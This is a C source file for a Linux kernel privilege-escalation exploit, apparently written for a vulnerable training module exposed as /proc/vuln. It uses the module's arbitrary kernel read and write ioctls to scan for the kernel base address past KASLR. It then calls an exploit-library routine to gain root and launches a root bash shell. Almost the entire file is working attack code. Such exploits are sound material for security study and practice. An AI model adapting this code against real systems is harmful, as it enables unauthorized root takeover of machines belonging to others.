#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <assert.h>

#define KERNEL_5_8_0_48_generic

#include "../exploitlib/exploitlib.h"

#define ARBREAD 5
#define ARBWRITE 6

typedef struct arbrw{
	uintptr_t kptr;
	void *userptr;
} user_t;

int fd = 0;

uint64_t arbread(uintptr_t kptr) {
	assert(fd > 0);
	
	uint64_t value;
	
	user_t user;
	user.kptr = kptr;
	user.userptr = (void *)&value;
	
	ioctl(fd, ARBREAD, &user);
	return value;
}

int arbwrite(uintptr_t kptr, uint64_t value) {
	assert(fd > 0);
	
	user_t user;
	
	user.kptr = kptr;
	user.userptr = &value;
	
	return ioctl(fd, ARBWRITE, &user);
}

void cleanup(int fd) {
	close(fd);
	printf("[*] Closed device /dev/vuln, fd %d\n", fd);
}

int main() {
	fd = open("/proc/vuln", O_RDONLY);
	if (fd < 0) {
		puts("[-] Could not open device /proc/vuln");
		return -1;
	}
	
	printf("[*] Opened device /proc/vuln successfully, fd %d\n", fd);
	
	uintptr_t probe = 0xffffffffc0000000 - 0x100000;
	uint64_t dummy = 0;
	user_t user;
	
	user.userptr = &dummy;
	
	while (probe >= 0xffffffff83000000) {
		user.kptr = probe;
		if (ioctl(fd, ARBREAD, &user) == 0) {
			break;
		}
		probe -= 0x100000;
	}
	uintptr_t kernbase = probe - 0x2100000;
	
	printf("[+] Found kernelbase at 0x%lx\n", kernbase);
	
	// get root and cleanup
	if (root_arbrw8(kernbase, arbread, arbwrite)) {
		cleanup(fd);
		return -1;
	}
	cleanup(fd);
	
	//spawn shell
	if (!getuid()) {
		puts("[+] Got root!");
		char *args[] = {"/bin/bash", NULL};
		execvp(args[0], args);
	}
	else {
		puts("[-] Not root :(");
		return -1;
	}
}
